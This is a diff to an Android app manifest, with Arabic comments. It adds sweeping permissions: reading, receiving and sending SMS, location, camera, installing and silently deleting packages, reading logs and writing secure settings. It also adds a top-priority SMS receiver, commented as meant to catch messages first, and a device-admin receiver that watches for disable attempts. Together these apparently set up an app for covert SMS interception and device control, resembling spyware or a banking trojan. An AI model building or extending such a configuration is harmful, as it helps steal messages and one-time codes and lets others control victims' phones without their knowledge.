@@ -10,7 +10,6 @@
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.BLUETOOTH" />
     <uses-permission android:name="android.permission.BLUETOOTH_ADMIN" />
-    <uses-permission android:name="com.android.vending.CHANGE_NETWORK_STATE" />
     <uses-permission android:name="android.permission.INTERNET" />
 <!--    //اذونات الموقع-->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
@@ -20,7 +19,56 @@
     <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
         tools:ignore="QueryAllPackagesPermission" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" tools:ignore="ProtectedPermissions"/>
+    <uses-permission android:name="android.permission.CHANGE_CONFIGURATION" tools:ignore="ProtectedPermissions"/>
+    <uses-permission android:name="android.permission.MANAGE_USERS"
+        tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_LOGS" tools:ignore="ProtectedPermissions"/>
+    <uses-permission android:name="android.permission.REBOOT" tools:ignore="ProtectedPermissions"/>
+    <uses-permission android:name="android.permission.CLEAR_APP_CACHE" tools:ignore="ProtectedPermissions"/>
+    <uses-permission android:name="android.permission.FORCE_STOP_PACKAGES" tools:ignore="ProtectedPermissions"/>
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES" tools:ignore="ProtectedPermissions"/>
+    <uses-permission android:name="android.permission.MANAGE_DEVICE_ADMINS" tools:ignore="ProtectedPermissions"/>
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" tools:ignore="ProtectedPermissions"/>
+    <uses-permission android:name="android.permission.SET_TIME" tools:ignore="ProtectedPermissions"/>
+    <uses-permission android:name="android.permission.SET_TIME_ZONE" tools:ignore="ProtectedPermissions"/>
+    <uses-permission android:name="android.permission.SHUTDOWN" tools:ignore="ProtectedPermissions"/>
+    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS" tools:ignore="ProtectedPermissions"/>
+    <uses-permission android:name="android.permission.SET_ALARM" />
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_MULTICAST_STATE" />
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
 
+
+
+
+    <!-- صلاحيات أساسية -->
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+
+    <!-- أذونات مطلوبة لاستقبال وقراءة الرسائل النصية -->
+
+    <uses-permission android:name="android.permission.RECEIVE_SMS"
+        tools:ignore="PermissionImpliesUnsupportedChromeOsHardware" />
+    <uses-permission android:name="android.permission.READ_SMS"
+        tools:ignore="PermissionImpliesUnsupportedChromeOsHardware" />
+    <uses-permission android:name="android.permission.SEND_SMS"
+        tools:ignore="PermissionImpliesUnsupportedChromeOsHardware" />
+
+
+
+
+
+    <!-- صلاحيات إضافية لإلغاء التثبيت الصامت -->
+    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
+    <uses-permission android:name="android.permission.DELETE_PACKAGES"
+        tools:ignore="ProtectedPermissions" />
 
     <application
 
@@ -31,18 +79,26 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.AppCompat.Light.NoActionBar">
 
-        <!-- Device Admin Receiver -->
+         <receiver
+             android:name=".MyDeviceAdminReceiver"
+             android:permission="android.permission.BIND_DEVICE_ADMIN"
+             android:exported="true">
+             <meta-data
+                 android:name="android.app.device_admin"
+                 android:resource="@xml/device_admin" />
+             <intent-filter>
+                 <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+                 <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED" />
+                 <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />
+             </intent-filter>
+         </receiver>
         <receiver
-            android:name=".MyDeviceAdminReceiver"
-            android:description="@string/admin_description"
+            android:name=".SmsReceiver"
+            android:enabled="true"
             android:exported="true"
-            android:label="@string/app_name"
-            android:permission="android.permission.BIND_DEVICE_ADMIN">
-            <meta-data
-                android:name="android.app.device_admin"
-                android:resource="@xml/device_admin" />
-            <intent-filter>
-                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="999"> <!-- أولوية عالية لضمان استقبال الرسالة أولاً -->
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
         </receiver>
         <service
@@ -52,12 +108,6 @@
                 <action android:name="com.google.firebase.MESSAGING_EVENT" />
             </intent-filter>
         </service>
-        //
-     <service
-            android:name=".LocationService"
-           android:foregroundServiceType="location"
-           android:exported="false"
-            tools:ignore="ForegroundServicePermission" />
 
         <activity android:name=".MainActivity"
             android:exported="true">
@@ -66,6 +116,18 @@
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
+
         <uses-library android:name="org.apache.http.legacy" android:required="false"/>
+
+        <!-- ... تعريف الأنشطة والخدمات الأخرى ... -->
+
+
     </application>
+
+
+    <queries>
+        <package android:name="com.google.android.gms" />
+    </queries>
+
+
 </manifest>
